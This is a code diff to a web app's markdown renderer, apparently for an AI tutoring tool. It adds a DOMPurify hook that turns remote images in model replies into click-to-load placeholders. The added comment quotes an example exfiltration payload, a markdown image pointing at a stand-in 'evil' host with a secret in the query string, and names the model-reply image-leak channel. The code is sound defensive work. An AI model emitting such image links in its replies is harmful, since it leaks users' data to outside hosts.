@@ -671,6 +671,48 @@
   DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
     if (data.attrName === 'style' && node.closest && (node.closest('.katex') || node.closest('svg'))) data.forceKeepAttr = true;
   });
+  // A remote image in a reply is a request the model chooses the URL of (`![](https://evil/?q=secret)`): nothing loads
+  // by itself. The sanitizer moves the URL to data-remote; a processor shows a placeholder with the host, and a click
+  // loads it through the app (`teacher-remote:`, https only). The page's CSP allows no http(s) images at all.
+  const LOCAL_IMG = /^(?:data:image\/|teacher-blob:|blob:)/i;
+  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+    const tag = node.nodeName.toLowerCase();
+    if (tag === 'img') {
+      node.removeAttribute('data-remote'); node.removeAttribute('srcset');
+      const src = (node.getAttribute('src') || '').trim();
+      if (src && !LOCAL_IMG.test(src)) { node.removeAttribute('src'); node.setAttribute('data-remote', src.slice(0, 2000)); }
+    } else if (tag === 'source') { node.removeAttribute('srcset'); node.removeAttribute('src'); }
+    else if (tag === 'image' || tag === 'use' || tag === 'feimage') {
+      for (const a of ['href', 'xlink:href']) { const v = (node.getAttribute(a) || '').trim(); if (v && !v.startsWith('#') && !LOCAL_IMG.test(v)) node.removeAttribute(a); }
+    }
+  });
+  function remoteHost(url) {
+    try { const u = new URL(url, 'https://x.invalid/'); return { u, host: u.host, secure: u.protocol === 'https:' && u.host !== 'x.invalid' }; } catch (e) { return null; }
+  }
+  R.registerProcessor((root) => {
+    const list = Array.from(root.querySelectorAll ? root.querySelectorAll('img[data-remote]') : []);
+    if (root.matches && root.matches('img[data-remote]')) list.unshift(root);
+    for (const img of list) {
+      const url = img.getAttribute('data-remote'), h = remoteHost(url);
+      const b = document.createElement('span');
+      b.className = 'remote-img'; b.setAttribute('role', 'button'); b.tabIndex = 0;
+      if (h && h.secure) b.setAttribute('data-act', 'remote-img');
+      b.setAttribute('data-url', url);
+      b.title = url.slice(0, 300);
+      b.textContent = h ? (h.secure ? 'Image from ' + h.host + ' (click to load)' : 'Image not loaded (' + (h.host === 'x.invalid' ? 'not a web address' : 'not https: ' + h.host) + ')') : 'Image not loaded';
+      const alt = img.getAttribute('alt'); if (alt) b.setAttribute('aria-label', alt.slice(0, 200));
+      img.replaceWith(b);
+    }
+  });
+  R.registerAction('remote-img', (el) => {
+    const url = el.getAttribute('data-url'), h = remoteHost(url);
+    if (!h || !h.secure || !window.__remoteKey) return;
+    const img = document.createElement('img');
+    img.alt = el.getAttribute('aria-label') || '';
+    img.src = 'teacher-remote://img/?k=' + encodeURIComponent(window.__remoteKey) + '&u=' + encodeURIComponent(h.u.href);
+    img.onerror = () => { el.textContent = 'Image could not be loaded from ' + h.host; el.removeAttribute('data-act'); img.replaceWith(el); };
+    el.replaceWith(img);
+  });
   // Finished markdown is cached by content, so re-rendering a lesson (paging, a theme change, a card refresh) parses each
   // block once. The key carries the run outputs' count: a block's HTML gains its output when the learner runs it.
   const mdCache = new Cache(600, 6e6);
